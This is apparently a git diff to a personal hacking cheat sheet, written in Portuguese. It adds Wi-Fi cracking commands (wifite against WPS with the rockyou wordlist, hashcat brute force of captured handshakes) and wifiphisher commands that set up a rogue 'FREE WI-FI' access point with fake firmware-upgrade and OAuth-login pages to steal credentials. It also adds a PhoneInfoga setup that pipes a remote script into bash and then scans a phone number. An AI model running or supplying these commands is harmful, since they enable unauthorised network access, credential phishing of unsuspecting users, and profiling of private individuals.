@@ -16,12 +16,23 @@ git status
 
    ## WIFI ##
 
+#Mais efectivo (Só wifi com WPS ativado)
+Sudo wifite --wps -dict rockyou.txt 
+
+
 #Usando wifite para hanshake e hashcat para brute force
 sudo cap2hccapx <nombre del archivo>.cap <nombre del archivo>.hccapx (arquivo cap e onde tem as hanshake do wifite)
 (Caso a tentativa acima n funcione, tentar essa)
 https://hashcat.net/cap2hashcat/ (FUNCIONA)
 
 sudo hashcat -m 22000 -a3 ?d?d?d?d (aquivo).hccapx
+
+--------------------------------------------------------------------------------------------------
+
+   ## Capturando dados sociais por WIFI ##
+
+wifiphisher -aI wlan0 -eI wlan4 -p firmware-upgrade --handshake-capture handshake.pcap
+sudo wifiphisher --noextensions --essid "FREE WI-FI" -p oauth-login -kB
 
 --------------------------------------------------------------------------------------
 
@@ -113,6 +124,24 @@ cd URLSpoof
 chmod 777 urlspoof.sh
 bash urlspoof.sh
 urlspoof (para executar)
+
+----------------------------------------------------------------------------------------------
+  ## Osint Phone  ##
+
+# Download latest release in the current directory
+curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash
+
+#Unzip using this command
+tar -xf PhoneInfoga_Linux_x86_64.tar.gz
+
+# Check the binary
+./phoneinfoga version
+
+# You can also install it globally
+sudo mv ./phoneinfoga /usr/bin/phoneinfoga
+
+#Now scan a number
+phoneinfoga scan -n 8801xxxxxxxxx
 
 -----------------------------------------------------------------------------
 
